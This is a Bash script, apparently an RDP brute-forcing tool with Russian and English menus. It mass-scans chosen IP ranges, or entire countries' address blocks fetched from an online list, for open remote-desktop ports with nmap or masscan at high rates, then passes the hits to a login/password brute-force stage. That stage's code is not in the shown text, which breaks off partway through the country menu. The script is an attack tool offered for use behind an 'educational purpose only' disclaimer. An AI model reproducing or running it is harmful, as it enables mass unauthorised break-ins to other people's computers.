#!/bin/bash
# NOTE: YOU ARE FREE TO COPY,MODIFY,REUSE THE SOURCE CODE FOR EDUCATIONAL PURPOSE ONLY.
ver=1.32
clear
##########################################COLOR######################################
colorbase="\E[0m"
black="\033[1;30m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
aquamarine="\033[1;36m"
grey="\033[1;37m"
##########################################CLEAR#######################################
CLEARALL ()
{
rm -rf Results/ paused.conf list all_results result 2> /dev/null
}
######################################################################################

######################################################################################

######################################################################################
CLEARALL

#cat /etc/apt/sources.list_lazybak>/etc/apt/sources.list
rm -rf /etc/apt/sources.list_lazybak 2> /dev/null
clear

                  
echo -e       "$grey                                 +--------------------------------------+" 
echo -e       "$grey                                 |             Auto  Script             |"
echo -e "$aquamarine                                 |     by GetDrive & hackers Union      |" 
echo -e        "$red                                 |             Version 1.30             |"
#echo -e        "$red                                 |$colorbase https://github.com/getdrive/Lazy-RDP$red |"
echo -e        "$red                                 +--------------------------------------+ $colorbase"
#####################################CHECKLANGUAGE####################################
CHECKLANGUAGE ()
{
lang=$(locale | grep LANG | cut -d= -f2 | cut -d_ -f1)
if [ "$lang" = "ru" ];
	then 
read -p "                                    Введите номер порта RDP {3389} : " portn
port=$(echo $portn | sed -e 's/[^0-9]//g')
if [[ -z $port ]]
	then
port=3389 
echo ""
	else
echo ""
fi
if  [[ $port -gt -1 && $port -lt 65536 ]]
	then 
echo "                                       Установлено значение порта $port"
 MENURU
        else
echo -e $red"                                     Значение порта должно быть 0-65535"$colorbase
sleep 2
./src/rdp_brute.sh


fi
		else 
read -p "                                   Enter the port number RDP {3389} : " portn
port=$(echo $portn | sed -e 's/[^0-9]//g')   #sed -e 's/[^0-9]//g'
if [[ -z $port ]]
	then port=3389 
echo ""
	else
echo ""
fi
if  [[ $port -gt -1 && $port -lt 65536 ]]
	then
echo "                                        The port value was set $port"
 MENUENG
        else
echo -e $red"                                     The port value must be 0-65535"$colorbase
sleep 2
./src/rdp_brute.sh

fi	
fi
}
######################################################################################################
#######################################COUNTRYLIST####################################
COUNTRYLIST ()
{

echo -e "$grey 1.$yellow   Afghanistan              " " $grey 2.$yellow  Albania                  " "$grey 3.$yellow  Algeria"

echo -e "$grey 4.$yellow   American_samoa           " " $grey 5.$yellow  Andorra                  " "$grey 6.$yellow  Angola"

echo -e "$grey 7.$yellow   Anguilla                 " " $grey 8.$yellow  Antigua and barbuda      " "$grey 9.$yellow  Argentina"
echo -e "$grey 10.$yellow  Armenia                  " "$grey 11.$yellow  Aruba                   " "$grey 12.$yellow  Australia"

echo -e "$grey 13 $yellow  Austria                  " "$grey 14.$yellow  Azerbaijan              " "$grey 15.$yellow  Bahamas"

echo -e "$grey 16.$yellow  Bahrain                  " "$grey 17.$yellow  Bangladesh              " "$grey 18.$yellow  Barbados"

echo -e "$grey 19.$yellow  Belarus                  " "$grey 20.$yellow  Belgium                 " "$grey 21.$yellow  Belize"

echo -e "$grey 22.$yellow  Benin                    " "$grey 23.$yellow  Bermuda                 " "$grey 24.$yellow  Bhutan"

echo -e "$grey 25.$yellow  Bolivia                  " "$grey 26.$yellow  Bosnia and herzegowina  " "$grey 27.$yellow  Botswana"

echo -e "$grey 28.$yellow  Brazil                   " "$grey 29.$yellow  British ind ocean ter.  " "$grey 30.$yellow  Brunei darussalam"

echo -e "$grey 31.$yellow  Bulgaria                 " "$grey 32.$yellow  Burkina faso            " "$grey 33.$yellow  Burundi"

echo -e "$grey 34.$yellow  Cambodia                 " "$grey 35.$yellow  Cameroon                " "$grey 36.$yellow  Canada"

echo -e "$grey 37.$yellow  Cayman islands           " "$grey 38.$yellow  Central african republic" "$grey 39.$yellow  Chile"

echo -e "$grey 40.$yellow  China                    " "$grey 41.$yellow  Colombia                " "$grey 42.$yellow  Congo democratic republic"

echo -e "$grey 43.$yellow  Cook islands             " "$grey 44.$yellow  Costa rica              " "$grey 45.$yellow  Cote d'ivoire"

echo -e "$grey 46.$yellow  Croatia                  " "$grey 47.$yellow  Cuba                    " "$grey 48.$yellow  Cyprus"

echo -e "$grey 49.$yellow  Czech republic           " "$grey 50.$yellow  Denmark                 " "$grey 51.$yellow  Djibouti" 

echo -e "$grey 52.$yellow  Dominican republic       " "$grey 53.$yellow  Ecuador                 " "$grey 54.$yellow  Egypt"

echo -e "$grey 55.$yellow  El salvador              " "$grey 56.$yellow  Eritrea                 " "$grey 57.$yellow  Estonia"

echo -e "$grey 58.$yellow  Ethiopia                 " "$grey 59.$yellow  European union          " "$grey 60.$yellow  Faroe islands"

echo -e "$grey 61.$yellow  Fiji                     " "$grey 62.$yellow  Finland                 " "$grey 63.$yellow  France"

echo -e "$grey 64.$yellow  French guiana            " "$grey 65.$yellow  French polynesia        " "$grey 66.$yellow  Gabon"

echo -e "$grey 67.$yellow  Gambia                   " "$grey 68.$yellow  Georgia                 " "$grey 69.$yellow  Germany"

echo -e "$grey 70.$yellow  Ghana                    " "$grey 71.$yellow  Gibraltar               " "$grey 72.$yellow  Greece"

echo -e "$grey 73.$yellow  Greenland                " "$grey 74.$yellow  Grenada                 " "$grey 75.$yellow  Guam"

echo -e "$grey 76.$yellow  Guatemala                " "$grey 77.$yellow  Guinea-bissau           " "$grey 78.$yellow  Haiti"

echo -e "$grey 79.$yellow  Vatican city state       " "$grey 80.$yellow  Honduras                " "$grey 81.$yellow  Hong kong"

echo -e "$grey 82.$yellow  Hungary                  " "$grey 83.$yellow  Iceland                 " "$grey 84.$yellow  India"

echo -e "$grey 85.$yellow  Indonesia                " "$grey 86.$yellow  Iran islamic republic of" "$grey 87.$yellow  Iraq"

echo -e "$grey 88.$yellow  Ireland                  " "$grey 89.$yellow  Israel                  " "$grey 90.$yellow  Italy"

echo -e "$grey 91.$yellow  Jamaica                  " "$grey 92.$yellow  Japan                   " "$grey 93.$yellow  Jordan"

echo -e "$grey 94.$yellow  Kazakhstan               " "$grey 95.$yellow  Kenya                   " "$grey 96.$yellow  Kiribati"

echo -e "$grey 97.$yellow  Korea republic of        " "$grey 98.$yellow  Kuwait                  " "$grey 99.$yellow  Kyrgyzstan"

echo -e "$grey 100.$yellow Lao people's republic    " "$grey 101.$yellow Latvia                  " "$grey 102.$yellow Lebanon"

echo -e "$grey 103.$yellow Lesotho                  " "$grey 104.$yellow Libyan arab jamahiriya  " "$grey 105.$yellow Liechtenstein"

echo -e "$grey 106.$yellow Lithuania                " "$grey 107.$yellow Luxembourg              " "$grey 108.$yellow Macau"

echo -e "$grey 109.$yellow Macedonia                " "$grey 110.$yellow Madagascar              " "$grey 111.$yellow Malawi"

echo -e "$grey 112.$yellow Malaysia                 " "$grey 113.$yellow Maldives                " "$grey 114.$yellow Mali"

echo -e "$grey 115.$yellow Malta                    " "$grey 116.$yellow Mauritania              " "$grey 117.$yellow Mauritius"

echo -e "$grey 118.$yellow Mexico                   " "$grey 119.$yellow Micronesia fed states of" "$grey 120.$yellow Moldova republic of"

echo -e "$grey 121.$yellow Monaco                   " "$grey 122.$yellow Mongolia                " "$grey 123.$yellow Morocco"

echo -e "$grey 124.$yellow Mozambique               " "$grey 125.$yellow Myanmar                 " "$grey 126.$yellow Namibia"

echo -e "$grey 127.$yellow Nauru                    " "$grey 128.$yellow Nepal                   " "$grey 129.$yellow Netherlands"

echo -e "$grey 130.$yellow Montenegro               " "$grey 131.$yellow New caledonia           " "$grey 132.$yellow New zealand"

echo -e "$grey 133.$yellow Nicaragua                " "$grey 134.$yellow Niger                   " "$grey 135.$yellow Nigeria"

echo -e "$grey 136.$yellow Niue                     " "$grey 137.$yellow Non-spec asia pas loc.  " "$grey 138.$yellow Norfolk island"

echo -e "$grey 139.$yellow Northern mariana islands " "$grey 140.$yellow Norway                  " "$grey 141.$yellow Oman"

echo -e "$grey 142.$yellow Pakistan                 " "$grey 143.$yellow Palau                   " "$grey 144.$yellow Palestinian territory occupied"

echo -e "$grey 145.$yellow Panama                   " "$grey 146.$yellow Papua new guinea        " "$grey 147.$yellow Paraguay"

echo -e "$grey 148.$yellow Peru                     " "$grey 149.$yellow Philippines             " "$grey 150.$yellow Poland"

echo -e "$grey 151.$yellow Portugal                 " "$grey 152.$yellow Puerto rico             " "$grey 153.$yellow Qatar"

echo -e "$grey 154.$yellow Romania                  " "$grey 155.$yellow Russian federation      " "$grey 156.$yellow Rwanda"

echo -e "$grey 157.$yellow Saint kitts and nevis    " "$grey 158.$yellow Saint lucia             " "$grey 159.$yellow Samoa"

echo -e "$grey 160.$yellow San marino               " "$grey 161.$yellow Saudi arabia            " "$grey 162.$yellow Senegal"

echo -e "$grey 163.$yellow Serbia and montenegro    " "$grey 164.$yellow Seychelles              " "$grey 165.$yellow Sierra leone"

echo -e "$grey 166.$yellow Singapore                " "$grey 167.$yellow Slovakia                " "$grey 168.$yellow Slovenia"

echo -e "$grey 169.$yellow Solomon islands          " "$grey 170.$yellow South africa            " "$grey 171.$yellow Spain"

echo -e "$grey 172.$yellow Sri lanka                " "$grey 173.$yellow Sudan                   " "$grey 174.$yellow Suriname"

echo -e "$grey 175.$yellow Swaziland                " "$grey 176.$yellow Sweden                  " "$grey 177.$yellow Switzerland"

echo -e "$grey 178.$yellow Syrian                   " "$grey 179.$yellow Taiwan                  " "$grey 180.$yellow Tajikistan"

echo -e "$grey 181.$yellow Tanzania                 " "$grey 182.$yellow Thailand                " "$grey 183.$yellow Togo"

echo -e "$grey 184.$yellow Tonga                    " "$grey 185.$yellow Trinidad and tobago     " "$grey 186.$yellow Tunisia"

echo -e "$grey 187.$yellow Turkey                   " "$grey 188.$yellow Turkmenistan            " "$grey 189.$yellow Tuvalu"

echo -e "$grey 190.$yellow Uganda                   " "$grey 191.$yellow Ukraine                 " "$grey 192.$yellow United arab emirates"

echo -e "$grey 193.$yellow United kingdom           " "$grey 194.$yellow United states           " "$grey 195.$yellow Uruguay"

echo -e "$grey 196.$yellow Uzbekistan               " "$grey 197.$yellow Vanuatu                 " "$grey 198.$yellow Venezuela"

echo -e "$grey 199.$yellow Viet nam                 " "$grey 200.$yellow Virgin islands (british)" "$grey 201.$yellow Virgin islands (u.s.)"

echo -e "$grey 202.$yellow Yemen                    " "$grey 203.$yellow Zambia                  "  "$grey 204.$yellow Zimbabwe $colorbase"

}
######################################################################################

########################################################MENURU########################################
MENURU ()
{
echo ""
echo -e "$aquamarine            **********************************Главное меню********************************* $colorbase";
echo ""
echo -e "               +-----------------------------------------------------------------------+"
echo -e "               |$grey 1.$yellow Сканировать диапазон на наличие открытого RDP порта (ввод вручную)$colorbase | ";
echo -e "               |$grey 2.$yellow Сканировать диапазон на наличие открытого RDP порта (из файла)$colorbase     | ";
echo -e "               |$grey 3.$yellow Брутфорс Логин/Пароль (последнее сканирование)$colorbase                     | ";
echo -e "               |$grey 4.$yellow Выбор диапазона IP по стране$colorbase                                       | ";
echo -e "               |$grey 5.$yellow Выход ($red[ENTER]$yellow) $colorbase                                                   | ";
echo -e "               +-----------------------------------------------------------------------+"
echo " "
read -p "                                             Выбор из меню : " menuoption

if [ "$menuoption" = "1" ]; then
echo -e "$red---------------------------------------------------------------------------------------------------------$aquamarine"
read -p "Введите диапазон или одиночный IP {x.x.x.x/24,x.x.x.0-x.x.x.255} : " target
clear
echo -e " $colorbase              +-----------------------------------------------------------------------+"   
echo -e "               |   $grey                            1.$yellow Nmap$colorbase                                 |";
echo -e "               |   $grey                            2.$yellow Masscan$colorbase                              |";
echo -e "               +-----------------------------------------------------------------------+"
read -p "                                            Выберите сканер : " scan
echo -e "$red-------------------------------------------------------------------------------"
clear
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                          Идет поиск открытых RDP.$colorbase"
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$yellow*Для выхода из режима сканирования $red'CTRL+C'$colorbase"
if [ "$scan" = "1" ]; then
nmap -Pn -sS $target -p $port --open | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
CHECKFILERU
	else
rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate $green"
echo ""

break
		
		else		
echo -e "$red                                   Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done


masscan $target -p $port --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
fi
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
CHECKFILERU

                         
echo ""                                  
echo -e "$aquamarine                            Адреса с открытым RDP портом:$green"    
cat open3389                         
echo ""
echo -e "$red Хосты с открытым RDP портом записаны в файл $PWD/open3389"
sleep 2
clear
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"


MAINBRUTEMENURU
else

if [ "$menuoption" = "2" ]; then
echo -e "$aquamarine**************************************************************************************************$green"
read -p "*Введите путь к файлу с диапазонами IP {listip.txt,listip..& etc.} : " listname

clear
echo -e " $colorbase              +-----------------------------------------------------------------------+"   
echo -e "               |   $grey                            1.$yellow Nmap$colorbase                                 |";
echo -e "               |   $grey                            2.$yellow Masscan$colorbase                              |";
echo -e "               +-----------------------------------------------------------------------+"
read -p "                                            Выберите сканер : " scan
echo -e "$red-------------------------------------------------------------------------------"
clear
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                          Идет поиск открытых RDP.$colorbase"
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$yellow*Для выхода из режима сканирования $red'CTRL+C'$colorbase"
if [ "$scan" = "1" ]; then
nmap -Pn -sS -iL $listname -p $port --open | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
CHECKFILERU
	else
rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate $green"
echo ""

break
		
		else		
echo -e "$red                                   Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL $listname --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
fi
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
CHECKFILERU


echo ""
echo -e "$aquamarine                            Адреса с открытым RDP портом:$green" 
cat open3389
echo ""
echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"

echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU
else

if [ "$menuoption" = "3" ]; then
clear
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

# http://www.nirsoft.net/countryip
#
MAINBRUTEMENURU
else
if [ "$menuoption" = "4" ]; then
COUNTRYLIST
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
read -p "                          Выберите страну {1/2/3/& etc.}: " country
clear

echo -e "$aquamarine                                             Получаем список IP"
echo ""
if [ "$country"  = "1" ]; then
curl http://services.ce3c.be/ciprg/?countrys=AFGHANISTAN|grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Afghanistan://g" > list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""
echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2

echo ""
rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -iL list -p $port --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""

echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU
else

clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""
if [ "$country"  = "2" ]; then
curl http://services.ce3c.be/ciprg/?countrys=ALBANIA|grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Albania://g">list
clear
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""



echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""

echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU
else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "3" ]; then
curl http://services.ce3c.be/ciprg/?countrys=ALGERIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Algeria://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU




echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"



echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "4" ]; then
curl http://services.ce3c.be/ciprg/?countrys=AMERICAN+SAMOA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/American Samoa://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""

echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"


MAINBRUTEMENURU
else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "5" ]; then
curl http://services.ce3c.be/ciprg/?countrys=ANDORRA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Andorra://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""

echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU
else

clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "6" ]; then
curl http://services.ce3c.be/ciprg/?countrys=ANGOLA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Angola://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""

echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU
else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "7" ]; then
curl http://services.ce3c.be/ciprg/?countrys=ANGUILLA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Anguilla://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""

echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU
else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "8" ]; then
curl http://services.ce3c.be/ciprg/?countrys=ANTIGUA+AND+BARBUDA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Antigua and Barbuda://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU
else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "9" ]; then
curl http://services.ce3c.be/ciprg/?countrys=ARGENTINA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Argentina://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
